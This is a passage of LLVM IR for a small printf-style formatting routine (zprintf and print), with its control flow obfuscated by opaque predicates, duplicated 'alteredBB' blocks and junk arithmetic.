originalBB1alteredBB:                             ; preds = %originalBB1, %63
  %141 = load i8*, i8** %2, align 8
  %142 = load i32, i32* %3, align 4
  %143 = sext i32 %142 to i64
  %144 = getelementptr inbounds i8, i8* %141, i64 %143
  %145 = load i8, i8* %144, align 1
  %146 = load i8*, i8** %2, align 8
  %147 = load i32, i32* %3, align 4
  %148 = load i32, i32* %4, align 4
  %_ = sub i32 %147, %148
  %gen = mul i32 %_, %148
  %_2 = sub i32 %147, %148
  %gen3 = mul i32 %_2, %148
  %_4 = sub i32 0, %147
  %gen5 = add i32 %_4, %148
  %_6 = sub i32 %147, %148
  %gen7 = mul i32 %_6, %148
  %149 = sub nsw i32 %147, %148
  %150 = sext i32 %149 to i64
  %151 = getelementptr inbounds i8, i8* %146, i64 %150
  store i8 %145, i8* %151, align 1
  br label %originalBB1

originalBB11alteredBB:                            ; preds = %originalBB11, %91
  %152 = load i32, i32* %3, align 4
  %_12 = sub i32 0, %152
  %gen13 = add i32 %_12, 1
  %_14 = sub i32 %152, 1
  %gen15 = mul i32 %_14, 1
  %_16 = sub i32 0, %152
  %gen17 = add i32 %_16, 1
  %_18 = sub i32 0, %152
  %gen19 = add i32 %_18, 1
  %_20 = sub i32 %152, 1
  %gen21 = mul i32 %_20, 1
  %153 = add nsw i32 %152, 1
  store i32 %153, i32* %3, align 4
  br label %originalBB11

originalBB25alteredBB:                            ; preds = %originalBB25, %110
  %154 = load i8*, i8** %2, align 8
  %155 = load i32, i32* %3, align 4
  %156 = load i32, i32* %4, align 4
  %_26 = shl i32 %155, %156
  %_27 = shl i32 %155, %156
  %_28 = shl i32 %155, %156
  %_29 = sub i32 0, %155
  %gen30 = add i32 %_29, %156
  %_31 = shl i32 %155, %156
  %_32 = sub i32 0, %155
  %gen33 = add i32 %_32, %156
  %_34 = sub i32 %155, %156
  %gen35 = mul i32 %_34, %156
  %_36 = sub i32 %155, %156
  %gen37 = mul i32 %_36, %156
  %_38 = sub i32 %155, %156
  %gen39 = mul i32 %_38, %156
  %157 = sub nsw i32 %155, %156
  %158 = sext i32 %157 to i64
  %159 = getelementptr inbounds i8, i8* %154, i64 %158
  store i8 0, i8* %159, align 1
  br label %originalBB25
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #4

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #4

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8*, ...) #0 {
  %2 = load i32, i32* @x.27
  %3 = load i32, i32* @y.28
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i8*, align 8
  %11 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %10, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %11, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %10, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %11, i32 0, i32 0
  %16 = call i32 @print(i8** null, i8* %14, %struct.__va_list_tag* %15)
  %17 = load i32, i32* @x.27
  %18 = load i32, i32* @y.28
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i32 %16

originalBBalteredBB:                              ; preds = %originalBB, %1
  %25 = alloca i8*, align 8
  %26 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %25, align 8
  %27 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %26, i32 0, i32 0
  %28 = bitcast %struct.__va_list_tag* %27 to i8*
  call void @llvm.va_start(i8* %28)
  %29 = load i8*, i8** %25, align 8
  %30 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %26, i32 0, i32 0
  %31 = call i32 @print(i8** null, i8* %29, %struct.__va_list_tag* %30)
  br label %originalBB
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #5

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  br label %12

; <label>:12:                                     ; preds = %411, %3
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  br i1 %16, label %17, label %414

; <label>:17:                                     ; preds = %12
  %18 = load i8*, i8** %5, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 37
  br i1 %21, label %22, label %386

; <label>:22:                                     ; preds = %17
  %23 = load i8*, i8** %5, align 8
  %24 = getelementptr inbounds i8, i8* %23, i32 1
  store i8* %24, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %25 = load i8*, i8** %5, align 8
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %29, label %46

; <label>:29:                                     ; preds = %22
  %30 = load i32, i32* @x.29
  %31 = load i32, i32* @y.30
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %29
  %38 = load i32, i32* @x.29
  %39 = load i32, i32* @y.30
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %414

; <label>:46:                                     ; preds = %22
  %47 = load i8*, i8** %5, align 8
  %48 = load i8, i8* %47, align 1
  %49 = zext i8 %48 to i32
  %50 = icmp eq i32 %49, 37
  br i1 %50, label %51, label %52

; <label>:51:                                     ; preds = %46
  br label %387

; <label>:52:                                     ; preds = %46
  %53 = load i8*, i8** %5, align 8
  %54 = load i8, i8* %53, align 1
  %55 = zext i8 %54 to i32
  %56 = icmp eq i32 %55, 45
  br i1 %56, label %57, label %60

; <label>:57:                                     ; preds = %52
  %58 = load i8*, i8** %5, align 8
  %59 = getelementptr inbounds i8, i8* %58, i32 1
  store i8* %59, i8** %5, align 8
  store i32 1, i32* %8, align 4
  br label %60

; <label>:60:                                     ; preds = %57, %52
  br label %61

; <label>:61:                                     ; preds = %66, %60
  %62 = load i8*, i8** %5, align 8
  %63 = load i8, i8* %62, align 1
  %64 = zext i8 %63 to i32
  %65 = icmp eq i32 %64, 48
  br i1 %65, label %66, label %71

; <label>:66:                                     ; preds = %61
  %67 = load i8*, i8** %5, align 8
  %68 = getelementptr inbounds i8, i8* %67, i32 1
  store i8* %68, i8** %5, align 8
  %69 = load i32, i32* %8, align 4
  %70 = or i32 %69, 2
  store i32 %70, i32* %8, align 4
  br label %61

; <label>:71:                                     ; preds = %61
  br label %72

; <label>:72:                                     ; preds = %93, %71
  %73 = load i8*, i8** %5, align 8
  %74 = load i8, i8* %73, align 1
  %75 = zext i8 %74 to i32
  %76 = icmp sge i32 %75, 48
  br i1 %76, label %77, label %82

; <label>:77:                                     ; preds = %72
  %78 = load i8*, i8** %5, align 8
  %79 = load i8, i8* %78, align 1
  %80 = zext i8 %79 to i32
  %81 = icmp sle i32 %80, 57
  br label %82

; <label>:82:                                     ; preds = %77, %72
  %83 = phi i1 [ false, %72 ], [ %81, %77 ]
  br i1 %83, label %84, label %96

; <label>:84:                                     ; preds = %82
  %85 = load i32, i32* %7, align 4
  %86 = mul nsw i32 %85, 10
  store i32 %86, i32* %7, align 4
  %87 = load i8*, i8** %5, align 8
  %88 = load i8, i8* %87, align 1
  %89 = zext i8 %88 to i32
  %90 = sub nsw i32 %89, 48
  %91 = load i32, i32* %7, align 4
  %92 = add nsw i32 %91, %90
  store i32 %92, i32* %7, align 4
  br label %93

; <label>:93:                                     ; preds = %84
  %94 = load i8*, i8** %5, align 8
  %95 = getelementptr inbounds i8, i8* %94, i32 1
  store i8* %95, i8** %5, align 8
  br label %72

; <label>:96:                                     ; preds = %82
  %97 = load i8*, i8** %5, align 8
  %98 = load i8, i8* %97, align 1
  %99 = zext i8 %98 to i32
  %100 = icmp eq i32 %99, 115
  br i1 %100, label %101, label %151

; <label>:101:                                    ; preds = %96
  %102 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %103 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %102, i32 0, i32 0
  %104 = load i32, i32* %103, align 8
  %105 = icmp ule i32 %104, 40
  br i1 %105, label %106, label %112

; <label>:106:                                    ; preds = %101
  %107 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %102, i32 0, i32 3
  %108 = load i8*, i8** %107, align 8
  %109 = getelementptr i8, i8* %108, i32 %104
  %110 = bitcast i8* %109 to i32*
  %111 = add i32 %104, 8
  store i32 %111, i32* %103, align 8
  br label %117

; <label>:112:                                    ; preds = %101
  %113 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %102, i32 0, i32 2
  %114 = load i8*, i8** %113, align 8
  %115 = bitcast i8* %114 to i32*
  %116 = getelementptr i8, i8* %114, i32 8
  store i8* %116, i8** %113, align 8
  br label %117

; <label>:117:                                    ; preds = %112, %106
  %118 = phi i32* [ %110, %106 ], [ %115, %112 ]
  %119 = load i32, i32* %118, align 4
  %120 = sext i32 %119 to i64
  %121 = inttoptr i64 %120 to i8*
  store i8* %121, i8** %11, align 8
  %122 = load i8**, i8*** %4, align 8
  %123 = load i8*, i8** %11, align 8
  %124 = icmp ne i8* %123, null
  br i1 %124, label %125, label %127

; <label>:125:                                    ; preds = %117
  %126 = load i8*, i8** %11, align 8
  br label %128

; <label>:127:                                    ; preds = %117
  br label %128

; <label>:128:                                    ; preds = %127, %125
  %129 = phi i8* [ %126, %125 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.209, i32 0, i32 0), %127 ]
  %130 = load i32, i32* @x.29
  %131 = load i32, i32* @y.30
  %132 = sub i32 %130, 1
  %133 = mul i32 %130, %132
  %134 = urem i32 %133, 2
  %135 = icmp eq i32 %134, 0
  %136 = icmp slt i32 %131, 10
  %137 = or i1 %135, %136
  br i1 %137, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %128
  %138 = load i32, i32* %7, align 4
  %139 = load i32, i32* %8, align 4
  %140 = call i32 @prints(i8** %122, i8* %129, i32 %138, i32 %139)
  %141 = load i32, i32* %9, align 4
  %142 = add nsw i32 %141, %140
  store i32 %142, i32* %9, align 4
  %143 = load i32, i32* @x.29
  %144 = load i32, i32* @y.30
  %145 = sub i32 %143, 1
  %146 = mul i32 %143, %145
  %147 = urem i32 %146, 2
  %148 = icmp eq i32 %147, 0
  %149 = icmp slt i32 %144, 10
  %150 = or i1 %148, %149
  br i1 %150, label %originalBBpart29, label %originalBB1alteredBB

originalBBpart29:                                 ; preds = %originalBB1
  br label %411

; <label>:151:                                    ; preds = %96
  %152 = load i8*, i8** %5, align 8
  %153 = load i8, i8* %152, align 1
  %154 = zext i8 %153 to i32
  %155 = icmp eq i32 %154, 100
  br i1 %155, label %156, label %181

; <label>:156:                                    ; preds = %151
  %157 = load i8**, i8*** %4, align 8
  %158 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %159 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %158, i32 0, i32 0
  %160 = load i32, i32* %159, align 8
  %161 = icmp ule i32 %160, 40
  br i1 %161, label %162, label %168

; <label>:162:                                    ; preds = %156
  %163 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %158, i32 0, i32 3
  %164 = load i8*, i8** %163, align 8
  %165 = getelementptr i8, i8* %164, i32 %160
  %166 = bitcast i8* %165 to i32*
  %167 = add i32 %160, 8
  store i32 %167, i32* %159, align 8
  br label %173

; <label>:168:                                    ; preds = %156
  %169 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %158, i32 0, i32 2
  %170 = load i8*, i8** %169, align 8
  %171 = bitcast i8* %170 to i32*
  %172 = getelementptr i8, i8* %170, i32 8
  store i8* %172, i8** %169, align 8
  br label %173

; <label>:173:                                    ; preds = %168, %162
  %174 = phi i32* [ %166, %162 ], [ %171, %168 ]
  %175 = load i32, i32* %174, align 4
  %176 = load i32, i32* %7, align 4
  %177 = load i32, i32* %8, align 4
  %178 = call i32 @printi(i8** %157, i32 %175, i32 10, i32 1, i32 %176, i32 %177, i32 97)
  %179 = load i32, i32* %9, align 4
  %180 = add nsw i32 %179, %178
  store i32 %180, i32* %9, align 4
  br label %411

; <label>:181:                                    ; preds = %151
  %182 = load i8*, i8** %5, align 8
  %183 = load i8, i8* %182, align 1
  %184 = zext i8 %183 to i32
  %185 = icmp eq i32 %184, 120
  br i1 %185, label %186, label %211

; <label>:186:                                    ; preds = %181
  %187 = load i8**, i8*** %4, align 8
  %188 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %189 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %188, i32 0, i32 0
  %190 = load i32, i32* %189, align 8
  %191 = icmp ule i32 %190, 40
  br i1 %191, label %192, label %198

; <label>:192:                                    ; preds = %186
  %193 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %188, i32 0, i32 3
  %194 = load i8*, i8** %193, align 8
  %195 = getelementptr i8, i8* %194, i32 %190
  %196 = bitcast i8* %195 to i32*
  %197 = add i32 %190, 8
  store i32 %197, i32* %189, align 8
  br label %203

; <label>:198:                                    ; preds = %186
  %199 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %188, i32 0, i32 2
  %200 = load i8*, i8** %199, align 8
  %201 = bitcast i8* %200 to i32*
  %202 = getelementptr i8, i8* %200, i32 8
  store i8* %202, i8** %199, align 8
  br label %203

; <label>:203:                                    ; preds = %198, %192
  %204 = phi i32* [ %196, %192 ], [ %201, %198 ]
  %205 = load i32, i32* %204, align 4
  %206 = load i32, i32* %7, align 4
  %207 = load i32, i32* %8, align 4
  %208 = call i32 @printi(i8** %187, i32 %205, i32 16, i32 0, i32 %206, i32 %207, i32 97)
  %209 = load i32, i32* %9, align 4
  %210 = add nsw i32 %209, %208
  store i32 %210, i32* %9, align 4
  br label %411

; <label>:211:                                    ; preds = %181
  %212 = load i8*, i8** %5, align 8
  %213 = load i8, i8* %212, align 1
  %214 = zext i8 %213 to i32
  %215 = icmp eq i32 %214, 88
  br i1 %215, label %216, label %273

; <label>:216:                                    ; preds = %211
  %217 = load i8**, i8*** %4, align 8
  %218 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %219 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %218, i32 0, i32 0
  %220 = load i32, i32* %219, align 8
  %221 = icmp ule i32 %220, 40
  br i1 %221, label %222, label %244

; <label>:222:                                    ; preds = %216
  %223 = load i32, i32* @x.29
  %224 = load i32, i32* @y.30
  %225 = sub i32 %223, 1
  %226 = mul i32 %223, %225
  %227 = urem i32 %226, 2
  %228 = icmp eq i32 %227, 0
  %229 = icmp slt i32 %224, 10
  %230 = or i1 %228, %229
  br i1 %230, label %originalBB11, label %originalBB11alteredBB

originalBB11:                                     ; preds = %originalBB11alteredBB, %222
  %231 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %218, i32 0, i32 3
  %232 = load i8*, i8** %231, align 8
  %233 = getelementptr i8, i8* %232, i32 %220
  %234 = bitcast i8* %233 to i32*
  %235 = add i32 %220, 8
  store i32 %235, i32* %219, align 8
  %236 = load i32, i32* @x.29
  %237 = load i32, i32* @y.30
  %238 = sub i32 %236, 1
  %239 = mul i32 %236, %238
  %240 = urem i32 %239, 2
  %241 = icmp eq i32 %240, 0
  %242 = icmp slt i32 %237, 10
  %243 = or i1 %241, %242
  br i1 %243, label %originalBBpart217, label %originalBB11alteredBB

originalBBpart217:                                ; preds = %originalBB11
  br label %265

; <label>:244:                                    ; preds = %216
  %245 = load i32, i32* @x.29
  %246 = load i32, i32* @y.30
  %247 = sub i32 %245, 1
  %248 = mul i32 %245, %247
  %249 = urem i32 %248, 2
  %250 = icmp eq i32 %249, 0
  %251 = icmp slt i32 %246, 10
  %252 = or i1 %250, %251
  br i1 %252, label %originalBB19, label %originalBB19alteredBB

originalBB19:                                     ; preds = %originalBB19alteredBB, %244
  %253 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %218, i32 0, i32 2
  %254 = load i8*, i8** %253, align 8
  %255 = bitcast i8* %254 to i32*
  %256 = getelementptr i8, i8* %254, i32 8
  store i8* %256, i8** %253, align 8
  %257 = load i32, i32* @x.29
  %258 = load i32, i32* @y.30
  %259 = sub i32 %257, 1
  %260 = mul i32 %257, %259
  %261 = urem i32 %260, 2
  %262 = icmp eq i32 %261, 0
  %263 = icmp slt i32 %258, 10
  %264 = or i1 %262, %263
  br i1 %264, label %originalBBpart221, label %originalBB19alteredBB

originalBBpart221:                                ; preds = %originalBB19
  br label %265

; <label>:265:                                    ; preds = %originalBBpart221, %originalBBpart217
  %266 = phi i32* [ %234, %originalBBpart217 ], [ %255, %originalBBpart221 ]
  %267 = load i32, i32* %266, align 4
  %268 = load i32, i32* %7, align 4
  %269 = load i32, i32* %8, align 4
  %270 = call i32 @printi(i8** %217, i32 %267, i32 16, i32 0, i32 %268, i32 %269, i32 65)
  %271 = load i32, i32* %9, align 4
  %272 = add nsw i32 %271, %270
  store i32 %272, i32* %9, align 4
  br label %411

; <label>:273:                                    ; preds = %211
  %274 = load i8*, i8** %5, align 8
  %275 = load i8, i8* %274, align 1
  %276 = zext i8 %275 to i32
  %277 = icmp eq i32 %276, 117
  br i1 %277, label %278, label %319

; <label>:278:                                    ; preds = %273
  %279 = load i8**, i8*** %4, align 8
  %280 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %281 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %280, i32 0, i32 0
  %282 = load i32, i32* %281, align 8
  %283 = icmp ule i32 %282, 40
  br i1 %283, label %284, label %290

; <label>:284:                                    ; preds = %278
  %285 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %280, i32 0, i32 3
  %286 = load i8*, i8** %285, align 8
  %287 = getelementptr i8, i8* %286, i32 %282
  %288 = bitcast i8* %287 to i32*
  %289 = add i32 %282, 8
  store i32 %289, i32* %281, align 8
  br label %311

; <label>:290:                                    ; preds = %278
  %291 = load i32, i32* @x.29
  %292 = load i32, i32* @y.30
  %293 = sub i32 %291, 1
  %294 = mul i32 %291, %293
  %295 = urem i32 %294, 2
  %296 = icmp eq i32 %295, 0
  %297 = icmp slt i32 %292, 10
  %298 = or i1 %296, %297
  br i1 %298, label %originalBB23, label %originalBB23alteredBB

originalBB23:                                     ; preds = %originalBB23alteredBB, %290
  %299 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %280, i32 0, i32 2
  %300 = load i8*, i8** %299, align 8
  %301 = bitcast i8* %300 to i32*
  %302 = getelementptr i8, i8* %300, i32 8
  store i8* %302, i8** %299, align 8
  %303 = load i32, i32* @x.29
  %304 = load i32, i32* @y.30
  %305 = sub i32 %303, 1
  %306 = mul i32 %303, %305
  %307 = urem i32 %306, 2
  %308 = icmp eq i32 %307, 0
  %309 = icmp slt i32 %304, 10
  %310 = or i1 %308, %309
  br i1 %310, label %originalBBpart225, label %originalBB23alteredBB

originalBBpart225:                                ; preds = %originalBB23
  br label %311

; <label>:311:                                    ; preds = %originalBBpart225, %284
  %312 = phi i32* [ %288, %284 ], [ %301, %originalBBpart225 ]
  %313 = load i32, i32* %312, align 4
  %314 = load i32, i32* %7, align 4
  %315 = load i32, i32* %8, align 4
  %316 = call i32 @printi(i8** %279, i32 %313, i32 10, i32 0, i32 %314, i32 %315, i32 97)
  %317 = load i32, i32* %9, align 4
  %318 = add nsw i32 %317, %316
  store i32 %318, i32* %9, align 4
  br label %411

; <label>:319:                                    ; preds = %273
  %320 = load i8*, i8** %5, align 8
  %321 = load i8, i8* %320, align 1
  %322 = zext i8 %321 to i32
  %323 = icmp eq i32 %322, 99
  br i1 %323, label %324, label %369

; <label>:324:                                    ; preds = %319
  %325 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %326 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %325, i32 0, i32 0
  %327 = load i32, i32* %326, align 8
  %328 = icmp ule i32 %327, 40
  br i1 %328, label %329, label %335

; <label>:329:                                    ; preds = %324
  %330 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %325, i32 0, i32 3
  %331 = load i8*, i8** %330, align 8
  %332 = getelementptr i8, i8* %331, i32 %327
  %333 = bitcast i8* %332 to i32*
  %334 = add i32 %327, 8
  store i32 %334, i32* %326, align 8
  br label %356

; <label>:335:                                    ; preds = %324
  %336 = load i32, i32* @x.29
  %337 = load i32, i32* @y.30
  %338 = sub i32 %336, 1
  %339 = mul i32 %336, %338
  %340 = urem i32 %339, 2
  %341 = icmp eq i32 %340, 0
  %342 = icmp slt i32 %337, 10
  %343 = or i1 %341, %342
  br i1 %343, label %originalBB27, label %originalBB27alteredBB

originalBB27:                                     ; preds = %originalBB27alteredBB, %335
  %344 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %325, i32 0, i32 2
  %345 = load i8*, i8** %344, align 8
  %346 = bitcast i8* %345 to i32*
  %347 = getelementptr i8, i8* %345, i32 8
  store i8* %347, i8** %344, align 8
  %348 = load i32, i32* @x.29
  %349 = load i32, i32* @y.30
  %350 = sub i32 %348, 1
  %351 = mul i32 %348, %350
  %352 = urem i32 %351, 2
  %353 = icmp eq i32 %352, 0
  %354 = icmp slt i32 %349, 10
  %355 = or i1 %353, %354
  br i1 %355, label %originalBBpart229, label %originalBB27alteredBB

originalBBpart229:                                ; preds = %originalBB27
  br label %356

; <label>:356:                                    ; preds = %originalBBpart229, %329
  %357 = phi i32* [ %333, %329 ], [ %346, %originalBBpart229 ]
  %358 = load i32, i32* %357, align 4
  %359 = trunc i32 %358 to i8
  %360 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %359, i8* %360, align 1
  %361 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %361, align 1
  %362 = load i8**, i8*** %4, align 8
  %363 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %364 = load i32, i32* %7, align 4
  %365 = load i32, i32* %8, align 4
  %366 = call i32 @prints(i8** %362, i8* %363, i32 %364, i32 %365)
  %367 = load i32, i32* %9, align 4
  %368 = add nsw i32 %367, %366
  store i32 %368, i32* %9, align 4
  br label %411

; <label>:369:                                    ; preds = %319
  %370 = load i32, i32* @x.29
  %371 = load i32, i32* @y.30
  %372 = sub i32 %370, 1
  %373 = mul i32 %370, %372
  %374 = urem i32 %373, 2
  %375 = icmp eq i32 %374, 0
  %376 = icmp slt i32 %371, 10
  %377 = or i1 %375, %376
  br i1 %377, label %originalBB31, label %originalBB31alteredBB

originalBB31:                                     ; preds = %originalBB31alteredBB, %369
  %378 = load i32, i32* @x.29
  %379 = load i32, i32* @y.30
  %380 = sub i32 %378, 1
  %381 = mul i32 %378, %380
  %382 = urem i32 %381, 2
  %383 = icmp eq i32 %382, 0
  %384 = icmp slt i32 %379, 10
  %385 = or i1 %383, %384
  br i1 %385, label %originalBBpart233, label %originalBB31alteredBB

originalBBpart233:                                ; preds = %originalBB31
  br label %394

; <label>:386:                                    ; preds = %17
  br label %387

; <label>:387:                                    ; preds = %386, %51
  %388 = load i8**, i8*** %4, align 8
  %389 = load i8*, i8** %5, align 8
  %390 = load i8, i8* %389, align 1
  %391 = zext i8 %390 to i32
  call void @printchar(i8** %388, i32 %391)
  %392 = load i32, i32* %9, align 4
  %393 = add nsw i32 %392, 1
  store i32 %393, i32* %9, align 4
  br label %394

; <label>:394:                                    ; preds = %387, %originalBBpart233
  %395 = load i32, i32* @x.29
  %396 = load i32, i32* @y.30
  %397 = sub i32 %395, 1
  %398 = mul i32 %395, %397
  %399 = urem i32 %398, 2
  %400 = icmp eq i32 %399, 0
  %401 = icmp slt i32 %396, 10
  %402 = or i1 %400, %401
  br i1 %402, label %originalBB35, label %originalBB35alteredBB

originalBB35:                                     ; preds = %originalBB35alteredBB, %394
  %403 = load i32, i32* @x.29
  %404 = load i32, i32* @y.30
  %405 = sub i32 %403, 1
  %406 = mul i32 %403, %405
  %407 = urem i32 %406, 2
  %408 = icmp eq i32 %407, 0
  %409 = icmp slt i32 %404, 10
  %410 = or i1 %408, %409
  br i1 %410, label %originalBBpart237, label %originalBB35alteredBB

originalBBpart237:                                ; preds = %originalBB35
  br label %411

; <label>:411:                                    ; preds = %originalBBpart237, %356, %311, %265, %203, %173, %originalBBpart29
  %412 = load i8*, i8** %5, align 8
  %413 = getelementptr inbounds i8, i8* %412, i32 1
  store i8* %413, i8** %5, align 8
  br label %12

; <label>:414:                                    ; preds = %originalBBpart2, %12
  %415 = load i32, i32* @x.29
  %416 = load i32, i32* @y.30
  %417 = sub i32 %415, 1
  %418 = mul i32 %415, %417
  %419 = urem i32 %418, 2
  %420 = icmp eq i32 %419, 0
  %421 = icmp slt i32 %416, 10
  %422 = or i1 %420, %421
  br i1 %422, label %originalBB39, label %originalBB39alteredBB

originalBB39:                                     ; preds = %originalBB39alteredBB, %414
  %423 = load i8**, i8*** %4, align 8
  %424 = icmp ne i8** %423, null
  %425 = load i32, i32* @x.29
  %426 = load i32, i32* @y.30
  %427 = sub i32 %425, 1
  %428 = mul i32 %425, %427
  %429 = urem i32 %428, 2
  %430 = icmp eq i32 %429, 0
  %431 = icmp slt i32 %426, 10
  %432 = or i1 %430, %431
  br i1 %432, label %originalBBpart241, label %originalBB39alteredBB

originalBBpart241:                                ; preds = %originalBB39
  br i1 %424, label %433, label %436

; <label>:433:                                    ; preds = %originalBBpart241
  %434 = load i8**, i8*** %4, align 8
  %435 = load i8*, i8** %434, align 8
  store i8 0, i8* %435, align 1
  br label %436

; <label>:436:                                    ; preds = %433, %originalBBpart241
  %437 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %438 = bitcast %struct.__va_list_tag* %437 to i8*
  call void @llvm.va_end(i8* %438)
  %439 = load i32, i32* %9, align 4
  ret i32 %439

originalBBalteredBB:                              ; preds = %originalBB, %29
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %128
  %440 = load i32, i32* %7, align 4
  %441 = load i32, i32* %8, align 4
  %442 = call i32 @prints(i8** %122, i8* %129, i32 %440, i32 %441)
  %443 = load i32, i32* %9, align 4
  %_ = sub i32 0, %443
  %gen = add i32 %_, %442
  %_2 = shl i32 %443, %442
  %_3 = shl i32 %443, %442
  %_4 = sub i32 0, %443
  %gen5 = add i32 %_4, %442
  %_6 = shl i32 %443, %442
  %_7 = shl i32 %443, %442
  %444 = add nsw i32 %443, %442
  store i32 %444, i32* %9, align 4
  br label %originalBB1

originalBB11alteredBB:                            ; preds = %originalBB11, %222
  %445 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %218, i32 0, i32 3
  %446 = load i8*, i8** %445, align 8
  %447 = getelementptr i8, i8* %446, i32 %220
  %448 = bitcast i8* %447 to i32*
  %_12 = sub i32 %220, 8
  %gen13 = mul i32 %_12, 8
  %_14 = sub i32 %220, 8
  %gen15 = mul i32 %_14, 8
  %449 = add i32 %220, 8
  store i32 %449, i32* %219, align 8
  br label %originalBB11

originalBB19alteredBB:                            ; preds = %originalBB19, %244
  %450 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %218, i32 0, i32 2
  %451 = load i8*, i8** %450, align 8
  %452 = bitcast i8* %451 to i32*
  %453 = getelementptr i8, i8* %451, i32 8
  store i8* %453, i8** %450, align 8
  br label %originalBB19

originalBB23alteredBB:                            ; preds = %originalBB23, %290
  %454 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %280, i32 0, i32 2
  %455 = load i8*, i8** %454, align 8
  %456 = bitcast i8* %455 to i32*
  %457 = getelementptr i8, i8* %455, i32 8
  store i8* %457, i8** %454, align 8
  br label %originalBB23

originalBB27alteredBB:                            ; preds = %originalBB27, %335
  %458 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %325, i32 0, i32 2
  %459 = load i8*, i8** %458, align 8
  %460 = bitcast i8* %459 to i32*
  %461 = getelementptr i8, i8* %459, i32 8
  store i8* %461, i8** %458, align 8
  br label %originalBB27

